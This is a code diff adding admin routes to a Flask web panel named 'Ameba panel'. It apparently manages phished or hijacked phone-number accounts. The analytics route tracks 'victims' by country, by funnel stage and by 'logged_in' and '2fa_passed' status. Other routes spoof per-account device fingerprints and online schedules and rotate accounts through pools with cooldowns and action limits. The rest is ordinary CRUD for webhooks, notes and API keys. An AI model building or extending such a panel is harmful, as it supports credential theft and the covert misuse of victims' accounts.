@@ -2192,7 +2192,7 @@ def api_events_stream():
             except Exception as e:
                 log.error(f"SSE stream error: {e}")
                 yield ": error\n\n"
-            time.sleep(4)
+            time.sleep(15)
 
     return Response(generate(), mimetype='text/event-stream',
                     headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
@@ -3726,3 +3726,566 @@ def api_ab_test_delete(test_id):
     db.session.delete(test)
     db.session.commit()
     return jsonify({'success': True})
+
+
+# ==========================================
+# ACCOUNT HEALTH SCORE API
+# ==========================================
+@admin_bp.route('/api/accounts/<string:account_id>/health_score')
+@login_required
+def api_account_health_score(account_id):
+    """Returns health score for a specific account."""
+    account = db.session.get(Account, account_id)
+    if not account:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    from services.accounts.health_score import calculate_health_score, get_health_color, get_health_emoji
+    score = calculate_health_score(account)
+    return jsonify({
+        'success': True,
+        'account_id': account_id,
+        'score': score,
+        'color': get_health_color(score),
+        'emoji': get_health_emoji(score),
+    })
+
+
+@admin_bp.route('/api/accounts/health_scores')
+@login_required
+def api_accounts_health_scores():
+    """Returns health scores for all accounts."""
+    from services.accounts.health_score import calculate_health_score, get_health_color, get_health_emoji
+    accounts = db.session.query(Account).all()
+    result = []
+    for acc in accounts:
+        score = calculate_health_score(acc)
+        result.append({
+            'id': acc.id,
+            'phone': acc.phone,
+            'score': score,
+            'color': get_health_color(score),
+            'emoji': get_health_emoji(score),
+        })
+    return jsonify({'success': True, 'data': result})
+
+
+# ==========================================
+# ACCOUNT POOLS
+# ==========================================
+@admin_bp.route('/accounts/pools')
+@login_required
+def account_pools():
+    """Account pool management page."""
+    from models.account_pool import AccountPool, AccountPoolMember
+    pools = db.session.query(AccountPool).order_by(AccountPool.created_at.desc()).all()
+    # Add member count to each pool
+    pool_data = []
+    for p in pools:
+        count = db.session.query(AccountPoolMember).filter_by(pool_id=p.id).count()
+        pool_data.append({'pool': p, 'member_count': count})
+    return render_template('admin/account_pools.html', pool_data=pool_data)
+
+
+@admin_bp.route('/api/account_pools', methods=['POST'])
+@login_required
+def api_account_pool_create():
+    from models.account_pool import AccountPool
+    data = request.get_json() or {}
+    pool = AccountPool(
+        name=data.get('name', 'New Pool'),
+        description=data.get('description', ''),
+        selection_strategy=data.get('selection_strategy', 'round_robin'),
+        max_actions_per_account=data.get('max_actions_per_account', 50),
+        cooldown_minutes=data.get('cooldown_minutes', 60),
+        created_by=current_user.id,
+    )
+    db.session.add(pool)
+    db.session.commit()
+    log_action('account_pool_create', f'Created pool: {pool.name}')
+    return jsonify({'success': True, 'id': pool.id})
+
+
+@admin_bp.route('/api/account_pools/<int:pool_id>', methods=['PUT'])
+@login_required
+def api_account_pool_update(pool_id):
+    from models.account_pool import AccountPool
+    pool = db.session.get(AccountPool, pool_id)
+    if not pool:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    data = request.get_json() or {}
+    for field in ['name', 'description', 'selection_strategy', 'max_actions_per_account', 'cooldown_minutes']:
+        if field in data:
+            setattr(pool, field, data[field])
+    db.session.commit()
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/account_pools/<int:pool_id>', methods=['DELETE'])
+@login_required
+def api_account_pool_delete(pool_id):
+    from models.account_pool import AccountPool
+    pool = db.session.get(AccountPool, pool_id)
+    if not pool:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(pool)
+    db.session.commit()
+    log_action('account_pool_delete', f'Deleted pool: {pool.name}')
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/account_pools/<int:pool_id>/members', methods=['POST'])
+@login_required
+def api_account_pool_add_member(pool_id):
+    from models.account_pool import AccountPool, AccountPoolMember
+    pool = db.session.get(AccountPool, pool_id)
+    if not pool:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    data = request.get_json() or {}
+    account_ids = data.get('account_ids', [])
+    added = 0
+    for aid in account_ids:
+        existing = db.session.query(AccountPoolMember).filter_by(pool_id=pool_id, account_id=aid).first()
+        if not existing:
+            member = AccountPoolMember(pool_id=pool_id, account_id=aid)
+            db.session.add(member)
+            added += 1
+    db.session.commit()
+    return jsonify({'success': True, 'added': added})
+
+
+@admin_bp.route('/api/account_pools/<int:pool_id>/members/<string:account_id>', methods=['DELETE'])
+@login_required
+def api_account_pool_remove_member(pool_id, account_id):
+    from models.account_pool import AccountPoolMember
+    member = db.session.query(AccountPoolMember).filter_by(pool_id=pool_id, account_id=account_id).first()
+    if not member:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(member)
+    db.session.commit()
+    return jsonify({'success': True})
+
+
+# ==========================================
+# ACCOUNT BULK OPERATIONS
+# ==========================================
+@admin_bp.route('/accounts/bulk')
+@login_required
+def account_bulk():
+    """Bulk account operations page."""
+    accounts_list = db.session.query(Account).order_by(Account.phone).all()
+    return render_template('admin/account_bulk.html', accounts=accounts_list)
+
+
+@admin_bp.route('/api/accounts/bulk_edit', methods=['POST'])
+@login_required
+def api_accounts_bulk_edit():
+    """Bulk edit account profile fields."""
+    data = request.get_json() or {}
+    account_ids = data.get('account_ids', [])
+    fields = data.get('fields', {})
+    if not account_ids or not fields:
+        return jsonify({'success': False, 'error': 'account_ids and fields required'})
+    updated = 0
+    for aid in account_ids:
+        acc = db.session.get(Account, aid)
+        if acc:
+            for field in ['first_name', 'last_name', 'username']:
+                if field in fields and fields[field]:
+                    setattr(acc, field, fields[field])
+            updated += 1
+    db.session.commit()
+    log_action('bulk_edit_accounts', f'Bulk edited {updated} accounts')
+    return jsonify({'success': True, 'updated': updated})
+
+
+@admin_bp.route('/api/accounts/bulk_status', methods=['POST'])
+@login_required
+def api_accounts_bulk_status():
+    """Bulk change account status."""
+    data = request.get_json() or {}
+    account_ids = data.get('account_ids', [])
+    status = data.get('status', '')
+    if not account_ids or not status:
+        return jsonify({'success': False, 'error': 'account_ids and status required'})
+    updated = 0
+    for aid in account_ids:
+        acc = db.session.get(Account, aid)
+        if acc:
+            acc.status = status
+            updated += 1
+    db.session.commit()
+    log_action('bulk_status_accounts', f'Bulk set status={status} for {updated} accounts')
+    return jsonify({'success': True, 'updated': updated})
+
+
+# ==========================================
+# ACCOUNT TIMELINE
+# ==========================================
+@admin_bp.route('/accounts/<string:account_id>/timeline')
+@login_required
+def account_timeline(account_id):
+    """Visual activity timeline for a specific account."""
+    account = db.session.get(Account, account_id)
+    if not account:
+        from flask import abort
+        abort(404)
+    from models.account_log import AccountLog
+    page = request.args.get('page', 1, type=int)
+    type_filter = request.args.get('type', '').strip()
+    stmt = select(AccountLog).filter(AccountLog.account_id == account_id).order_by(desc(AccountLog.created_at))
+    if type_filter:
+        stmt = stmt.filter(AccountLog.action == type_filter)
+    timeline_events = db.paginate(stmt, page=page, per_page=50)
+    action_types = db.session.execute(
+        select(AccountLog.action).filter(AccountLog.account_id == account_id).distinct()
+    ).scalars().all()
+    return render_template('admin/account_timeline.html',
+                           account=account,
+                           timeline_events=timeline_events,
+                           action_types=action_types,
+                           type_filter=type_filter)
+
+
+# ==========================================
+# ACCOUNT FINGERPRINTS
+# ==========================================
+@admin_bp.route('/api/accounts/<string:account_id>/fingerprint', methods=['GET'])
+@login_required
+def api_account_fingerprint_get(account_id):
+    from models.account_fingerprint import AccountFingerprint
+    fp = db.session.query(AccountFingerprint).filter_by(account_id=account_id).first()
+    if not fp:
+        return jsonify({'success': False, 'error': 'No fingerprint found'})
+    return jsonify({'success': True, 'fingerprint': {
+        'device_model': fp.device_model,
+        'os_version': fp.os_version,
+        'app_version': fp.app_version,
+        'language': fp.language,
+        'timezone': fp.timezone,
+        'online_schedule': fp.online_schedule,
+    }})
+
+
+@admin_bp.route('/api/accounts/<string:account_id>/fingerprint', methods=['POST'])
+@login_required
+def api_account_fingerprint_save(account_id):
+    from models.account_fingerprint import AccountFingerprint
+    data = request.get_json() or {}
+    fp = db.session.query(AccountFingerprint).filter_by(account_id=account_id).first()
+    if not fp:
+        fp = AccountFingerprint(account_id=account_id)
+        db.session.add(fp)
+    for field in ['device_model', 'os_version', 'app_version', 'language', 'timezone', 'online_schedule']:
+        if field in data:
+            setattr(fp, field, data[field])
+    db.session.commit()
+    log_action('fingerprint_update', f'Updated fingerprint for account {account_id}')
+    return jsonify({'success': True})
+
+
+# ==========================================
+# ANALYTICS DASHBOARD
+# ==========================================
+@admin_bp.route('/analytics')
+@login_required
+def analytics():
+    """Dedicated analytics dashboard page."""
+    from services.analytics.reports import get_victim_stats_over_time, get_victim_country_distribution, get_funnel_data
+    days = request.args.get('days', 30, type=int)
+    stats_over_time = get_victim_stats_over_time(db, days=days)
+    country_dist = get_victim_country_distribution(db)
+    funnel = get_funnel_data(db)
+    # Victim geo data for map (lat/lon if available)
+    from models.victim import Victim
+    total_victims = db.session.query(func.count(Victim.id)).scalar() or 0
+    logged_in = db.session.query(func.count(Victim.id)).filter(Victim.status.in_(['logged_in', '2fa_passed'])).scalar() or 0
+    return render_template('admin/analytics.html',
+                           stats_over_time=stats_over_time,
+                           country_dist=country_dist,
+                           funnel=funnel,
+                           total_victims=total_victims,
+                           logged_in=logged_in,
+                           days=days)
+
+
+# ==========================================
+# WEBHOOK SYSTEM
+# ==========================================
+@admin_bp.route('/webhooks')
+@login_required
+def webhooks():
+    """Webhook management page."""
+    from models.webhook import Webhook, WebhookDelivery
+    webhooks_list = db.session.query(Webhook).order_by(Webhook.created_at.desc()).all()
+    recent_deliveries = db.session.query(WebhookDelivery).order_by(WebhookDelivery.created_at.desc()).limit(20).all()
+    return render_template('admin/webhooks.html',
+                           webhooks=webhooks_list,
+                           recent_deliveries=recent_deliveries)
+
+
+@admin_bp.route('/api/webhooks', methods=['POST'])
+@login_required
+def api_webhook_create():
+    from models.webhook import Webhook
+    data = request.get_json() or {}
+    if not data.get('url'):
+        return jsonify({'success': False, 'error': 'url required'})
+    wh = Webhook(
+        name=data.get('name', 'New Webhook'),
+        url=data['url'],
+        secret=data.get('secret', ''),
+        events=data.get('events', []),
+        is_active=data.get('is_active', True),
+        retry_count=data.get('retry_count', 3),
+        created_by=current_user.id,
+    )
+    db.session.add(wh)
+    db.session.commit()
+    log_action('webhook_create', f'Created webhook: {wh.name}')
+    return jsonify({'success': True, 'id': wh.id})
+
+
+@admin_bp.route('/api/webhooks/<int:webhook_id>', methods=['PUT'])
+@login_required
+def api_webhook_update(webhook_id):
+    from models.webhook import Webhook
+    wh = db.session.get(Webhook, webhook_id)
+    if not wh:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    data = request.get_json() or {}
+    for field in ['name', 'url', 'secret', 'events', 'is_active', 'retry_count']:
+        if field in data:
+            setattr(wh, field, data[field])
+    db.session.commit()
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/webhooks/<int:webhook_id>', methods=['DELETE'])
+@login_required
+def api_webhook_delete(webhook_id):
+    from models.webhook import Webhook
+    wh = db.session.get(Webhook, webhook_id)
+    if not wh:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(wh)
+    db.session.commit()
+    log_action('webhook_delete', f'Deleted webhook: {wh.name}')
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/webhooks/<int:webhook_id>/test', methods=['POST'])
+@login_required
+def api_webhook_test(webhook_id):
+    from models.webhook import Webhook
+    wh = db.session.get(Webhook, webhook_id)
+    if not wh:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    from services.webhook.dispatcher import dispatch_event
+    try:
+        dispatch_event('test', {'message': 'Test webhook from Ameba panel', 'webhook_id': webhook_id})
+        return jsonify({'success': True, 'message': 'Test event dispatched'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+# ==========================================
+# NOTES SYSTEM
+# ==========================================
+@admin_bp.route('/api/notes', methods=['GET'])
+@login_required
+def api_notes_list():
+    from models.note import Note
+    entity_type = request.args.get('entity_type', '')
+    entity_id = request.args.get('entity_id', '')
+    notes = db.session.query(Note).filter_by(entity_type=entity_type, entity_id=entity_id).order_by(Note.created_at.desc()).all()
+    return jsonify({'success': True, 'notes': [
+        {'id': n.id, 'content': n.content, 'created_by': n.created_by, 'created_at': str(n.created_at)}
+        for n in notes
+    ]})
+
+
+@admin_bp.route('/api/notes', methods=['POST'])
+@login_required
+def api_notes_create():
+    from models.note import Note
+    data = request.get_json() or {}
+    if not data.get('entity_type') or not data.get('entity_id') or not data.get('content'):
+        return jsonify({'success': False, 'error': 'entity_type, entity_id, content required'})
+    note = Note(
+        entity_type=data['entity_type'],
+        entity_id=str(data['entity_id']),
+        content=data['content'],
+        created_by=current_user.id,
+    )
+    db.session.add(note)
+    db.session.commit()
+    return jsonify({'success': True, 'id': note.id})
+
+
+@admin_bp.route('/api/notes/<int:note_id>', methods=['PUT'])
+@login_required
+def api_notes_update(note_id):
+    from models.note import Note
+    note = db.session.get(Note, note_id)
+    if not note:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    data = request.get_json() or {}
+    if 'content' in data:
+        note.content = data['content']
+    db.session.commit()
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/notes/<int:note_id>', methods=['DELETE'])
+@login_required
+def api_notes_delete(note_id):
+    from models.note import Note
+    note = db.session.get(Note, note_id)
+    if not note:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(note)
+    db.session.commit()
+    return jsonify({'success': True})
+
+
+# ==========================================
+# API KEYS MANAGEMENT
+# ==========================================
+@admin_bp.route('/api_keys')
+@login_required
+@admin_required
+def api_keys():
+    """API keys management page."""
+    from models.api_key import ApiKey
+    keys = db.session.query(ApiKey).order_by(ApiKey.created_at.desc()).all()
+    return render_template('admin/api_keys.html', keys=keys)
+
+
+@admin_bp.route('/api/api_keys', methods=['POST'])
+@login_required
+@admin_required
+def api_api_key_create():
+    from models.api_key import ApiKey
+    data = request.get_json() or {}
+    key_val = ApiKey.generate_key()
+    key = ApiKey(
+        name=data.get('name', 'New API Key'),
+        key=key_val,
+        permissions=data.get('permissions', []),
+        rate_limit=data.get('rate_limit', 100),
+        expires_at=None,
+        is_active=True,
+        created_by=current_user.id,
+    )
+    db.session.add(key)
+    db.session.commit()
+    log_action('api_key_create', f'Created API key: {key.name}')
+    return jsonify({'success': True, 'id': key.id, 'key': key_val})
+
+
+@admin_bp.route('/api/api_keys/<int:key_id>', methods=['PUT'])
+@login_required
+@admin_required
+def api_api_key_update(key_id):
+    from models.api_key import ApiKey
+    key = db.session.get(ApiKey, key_id)
+    if not key:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    data = request.get_json() or {}
+    for field in ['name', 'permissions', 'rate_limit', 'is_active']:
+        if field in data:
+            setattr(key, field, data[field])
+    db.session.commit()
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/api_keys/<int:key_id>', methods=['DELETE'])
+@login_required
+@admin_required
+def api_api_key_delete(key_id):
+    from models.api_key import ApiKey
+    key = db.session.get(ApiKey, key_id)
+    if not key:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(key)
+    db.session.commit()
+    log_action('api_key_delete', f'Deleted API key: {key.name}')
+    return jsonify({'success': True})
+
+
+# ==========================================
+# USER PROFILE PAGE
+# ==========================================
+@admin_bp.route('/profile')
+@login_required
+def profile():
+    """Current user's profile page."""
+    from models.user_session import UserSession
+    recent_actions = db.session.execute(
+        select(AdminLog)
+        .filter(AdminLog.username == current_user.username)
+        .order_by(desc(AdminLog.timestamp))
+        .limit(20)
+    ).scalars().all()
+    sessions = db.session.execute(
+        select(UserSession)
+        .filter(UserSession.user_id == current_user.id)
+        .order_by(desc(UserSession.created_at))
+        .limit(10)
+    ).scalars().all()
+    total_actions = db.session.execute(
+        select(func.count(AdminLog.id)).filter(AdminLog.username == current_user.username)
+    ).scalar() or 0
+    return render_template('admin/profile.html',
+                           recent_actions=recent_actions,
+                           sessions=sessions,
+                           total_actions=total_actions)
+
+
+# ==========================================
+# PANEL SETTINGS (CUSTOM BRANDING)
+# ==========================================
+@admin_bp.route('/api/panel_settings', methods=['GET'])
+@login_required
+def api_panel_settings_get():
+    from models.panel_settings import PanelSettings
+    settings = {s.key: s.value for s in db.session.query(PanelSettings).all()}
+    return jsonify({'success': True, 'settings': settings})
+
+
+@admin_bp.route('/api/panel_settings', methods=['POST'])
+@login_required
+@admin_required
+def api_panel_settings_save():
+    from models.panel_settings import PanelSettings
+    data = request.get_json() or {}
+    for k, v in data.items():
+        s = db.session.query(PanelSettings).filter_by(key=k).first()
+        if s:
+            s.value = v
+        else:
+            s = PanelSettings(key=k, value=v)
+            db.session.add(s)
+    db.session.commit()
+    log_action('panel_settings_update', f'Updated {len(data)} panel settings')
+    return jsonify({'success': True})
+
+
+# ==========================================
+# ASYNC UTILITY (Bug Fix #3)
+# ==========================================
+def run_async(coro):
+    """
+    Safely run an async coroutine from a synchronous Flask route.
+    Handles 'event loop already running' edge cases.
+    """
+    import asyncio
+    try:
+        loop = asyncio.get_event_loop()
+        if loop.is_running():
+            import concurrent.futures
+            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as pool:
+                future = pool.submit(asyncio.run, coro)
+                return future.result()
+        return loop.run_until_complete(coro)
+    except RuntimeError:
+        return asyncio.run(coro)
